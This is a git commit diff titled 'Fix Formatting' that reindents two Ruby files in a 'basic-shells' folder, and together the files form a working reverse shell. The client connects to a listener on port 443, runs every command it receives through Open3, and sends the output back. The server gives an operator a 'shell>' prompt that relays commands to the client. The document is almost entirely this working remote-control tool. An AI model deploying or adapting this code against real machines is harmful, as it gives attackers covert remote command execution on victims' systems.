60209f78ee7e86debdadd87dd66adb9b34eb9301
b00stfr3ak <goduke44@gmail.com>
2013-09-03 20:32:42 -0700

    Fix Formatting

--- basic-shells/client.rb
+++ basic-shells/client.rb
@@ -2,30 +2,30 @@ require 'socket'
 require 'open3'
 require 'shellwords'
 def command_loop(s)
-	loop {
-		command = s.recv(1024)
-		command = command.chomp
-		exit if command == 'exit'
+  loop {
+    command = s.recv(1024)
+    command = command.chomp
+    exit if command == 'exit'
     shell_command, *arguments = Shellwords.shellsplit(command)
     if BUILTINS[shell_command]
-			BUILTINS[shell_command].call(*arguments)
-			s.print(Dir.pwd)
-		else
-		  stdin, stdout_and_stderr = Open3.popen2e("#{command}")
-		  s.print("#{stdout_and_stderr.readlines.join.chomp}\0")
-		end
-	}
-	rescue
-		@s.puts("command does not exist\0")
-		command_loop(@s) 
+      BUILTINS[shell_command].call(*arguments)
+      s.print(Dir.pwd)
+    else
+      stdin, stdout_and_stderr = Open3.popen2e("#{command}")
+      s.print("#{stdout_and_stderr.readlines.join.chomp}\0")
+    end
+  }
+  rescue
+    @s.puts("command does not exist\0")
+    command_loop(@s) 
 end
 def connect_to_host()
-	hostname = '127.0.0.1'
-	port = 443
-	@s = TCPSocket.open(hostname, port)
-	command_loop(@s)
+  hostname = '127.0.0.1'
+  port = 443
+  @s = TCPSocket.open(hostname, port)
+  command_loop(@s)
 end
 begin
-	BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
-	connect_to_host()
+  BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
+  connect_to_host()
 end
--- basic-shells/server.rb
+++ basic-shells/server.rb
@@ -1,21 +1,21 @@
 require 'socket'
 def start_loop(client)
-	loop {
-		command = [(print ("shell> ")), $stdin.gets.rstrip][1]
-		start_loop(client) if command == ''
-		client.print("#{command}")
-		exit if command == 'exit'		
-		out_put = ''
-		recv_length = 1024
-		while (tmp = client.recv(recv_length))
-			out_put += tmp
-			break if tmp.length < recv_length
-		end
-		puts out_put.chomp
-	}
+  loop {
+    command = [(print ("shell> ")), $stdin.gets.rstrip][1]
+    start_loop(client) if command == ''
+    client.print("#{command}")
+    exit if command == 'exit'		
+    out_put = ''
+    recv_length = 1024
+    while (tmp = client.recv(recv_length))
+      out_put += tmp
+      break if tmp.length < recv_length
+    end
+    puts out_put.chomp
+  }
 end
 begin
-	server = TCPServer.open(443)
-	client = server.accept
-	start_loop(client)
+  server = TCPServer.open(443)
+  client = server.accept
+  start_loop(client)
 end
